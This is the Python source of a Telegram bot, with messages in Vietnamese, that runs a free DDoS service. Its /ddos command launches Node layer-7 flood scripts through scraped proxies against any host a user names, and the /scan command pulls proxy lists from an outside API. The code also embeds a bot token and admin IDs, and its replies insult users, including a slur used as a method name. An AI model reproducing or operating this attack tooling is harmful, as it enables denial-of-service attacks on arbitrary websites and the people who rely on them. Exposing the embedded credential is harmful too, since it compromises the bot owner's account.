from contextvars import copy_context
from copy import copy
import copyreg
import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6540792095:AAFRRi7qN0qkBBxWZqu5FWsqyQqoAZrmUFo'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1001723089040

allowed_users = [6412130255]
processes = []
ADMIN_ID = 6412130255
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_
 INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['adduser'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /adduser + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh 30 Ngày')


load_users_from_database()

@bot.message_handler(commands=['startbot', 'help'])
def help(message):
    help_text = '''
✔ DDoS hoàn toàn miễn phí nhưng ít chức năng ✔
📌 Tất Cả Các Lệnh 📌
1️⃣  Lệnh DDoS ( Tấn Công Website )
- /ddos + [methods] + [host] 💣
- /methods : Để Xem Methods ✔
2️⃣  Lệnh lấy và check proxy
- /updateproxy : Proxy Sẽ Tự Động Update Sau 10 Phút
[ Proxy Live 95% Die 5 % ]🤖
- /checkproxy : Check Số Lượng Proxy 🌌
- /scan : Để update proxy bằng api 💸
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 Tất Cả Methods:
🚀 Layer7 🚀
TLS            
DESTROY   
HTTPS 
HTTP-TLS
HTTP-LOAD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['ddos'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /ddos + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 1:
        remaining_time = int(1 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /ddos.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = ["chinhphu.vn", ".gov", ".edu", ".gob", ".www", ".violet", "ngocphong.com", "minhkhue.link", "onlytris.name.vn"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS' or method == 'TLSV1' or method == 'GOD' or method == 'UDP-FLOOD' or method == 'HTTP-FLOOD' or method == 'HTTP-TLS' or method == 'HTTP-SOCKET' or method == 'HTTP-GET' or method == 'HTTP-RAW' or method == 'TLS-BYPASS' or method == 'FLOOD-BYPASS   ' or method == 'NIGGER' :
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Mày ngu à, không thấy tên miền {blocked_domain}")
                return

    if method in ['TLS', 'HTTP-TLS', 'DESTROY', 'HTTP-LOAD', 'HTTPS']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "120", "64", "18"]
            duration = 120
        elif method == 'HTTPS':
            command = ["node", "HTTPS.js", host, "120", "64", "18"]
            duration = 120
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "120", "64", "18", "proxy.txt"]
            duration = 120
        elif method == 'HTTP-LOAD':
            command = ["node", "HTTP-LOAD.js", host, "120", "64", "18", "proxy.txt"]
            duration = 120
        elif method == 'HTTP-TLS':
            command = ["node", "HTTP-TLS.js", host, "120", "64", "18", "proxy.txt"]
            duration = 120

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━➤\n┃  💣 Successful Attack!!!💣\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━➤\n┣➤ Attack By ☃️ : @{username} \n┣➤ Host 💥: {host} \n┣➤ Methods 👾 : {method} \n┣➤ Time ⏰ : {duration} Giây\n┣➤ Admin👑 : @TunChoiNgu\n┣➤ Check host : https://check-host.net/check-http?host={host}\n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')

@bot.message_handler(commands=['checkproxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Không tìm thấy file proxy.txt.")
    else:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Số proxy mới update là: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['checkcpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['offbot'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')

@bot.message_handler(commands=['onbot'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Ngu à mày dell có đẳng cấp để sài lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True

@bot.message_handler(commands=['updateproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy.txt.") 

@bot.message_handler(commands=['scan'])
def handle_scan(message):
    try:
        # Lấy số lần muốn scan từ tin nhắn của người dùng
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "Vui lòng nhập số lần muốn scan, ví dụ: /scan 5")
            return

        num_scans = int(args[1])
        proxy_list = []

        api_url = 'https://api.thanhdieu.com/get-proxy.php?classify=http&key=binhvn'

        for _ in range(num_scans):
            response = requests.get(api_url)
            
            if response.status_code == 200:
                data = response.text
                cleaned_data = re.sub(r'[^0-9.: ]', '', data)
                proxy_list.extend(cleaned_data.strip().split())

        # Xóa 20 dòng đầu của danh sách proxy
        proxy_list = proxy_list[20:]

        with open('proxy.txt', 'w', encoding='utf-8') as proxy_file:
            proxy_file.write('\n'.join(proxy_list))

        bot.send_message(message.chat.id, 'Udate xng r nha thk buồi')

    except Exception as e:
        bot.send_message(message.chat.id, f'Có lỗi xảy ra: {str(e)}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, '✔ DDoS hoàn toàn miễn phí nhưng ít chức năng ✔.Nhấn /help để xem danh sách lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
